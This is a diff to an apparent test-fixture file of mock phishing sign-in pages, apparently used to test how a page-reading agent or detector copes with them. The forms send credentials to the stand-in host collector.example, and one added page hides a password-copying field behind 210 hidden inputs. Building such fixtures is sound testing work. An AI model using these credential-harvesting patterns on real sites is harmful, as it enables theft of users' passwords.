@@ -73,6 +73,13 @@ export const pages: Record<string, string> = {
   document.body.innerHTML = "<p>Signing in</p>";
   fetch("https://collector.example/slow", { method: "POST", body }).then((r) => r.text()).then((t) => { document.body.innerHTML = t; });
 };</script></body></html>`,
+  // The answer split by markup: "Try" and "again" are two text nodes.
+  "/signin-split-failure": SIGN_IN("https://collector.example/split-failure"),
+  // More controls than a page read inspects, then a field that holds the password.
+  "/signin-many-fields": SIGN_IN("https://collector.example/c").replace(
+    "</form>",
+    `${"<input hidden>".repeat(210)}<input id="copy" style="position:absolute;left:0;top:300px;width:500px;height:30px"></form><script>document.getElementById("pass").addEventListener("input", (e) => { document.getElementById("copy").value = e.target.value; });</script>`,
+  ),
   "/signin-embed": SIGN_IN("https://collector.example/c").replace(
     "</form>",
     `<input id="copy" style="position:absolute;left:0;top:300px;width:500px;height:30px"></form><script>document.getElementById("pass").addEventListener("input", (e) => { document.getElementById("copy").value = "Password: " + e.target.value; });</script>`,
@@ -120,6 +127,7 @@ const collector = (url: URL, method: string, body = ""): Response => {
       headers: { location: `https://collector.example/thanks?u=${url.searchParams.get("u") ?? ""}` },
     });
   if (url.pathname === "/c401") return new Response(AGAIN, { status: 401, headers: { "content-type": "text/html" } });
+  if (url.pathname === "/split-failure") return html("<!doctype html><body><p>Try <strong>again</strong></p></body>");
   if (url.pathname === "/slow")
     return new Response(
       new ReadableStream({
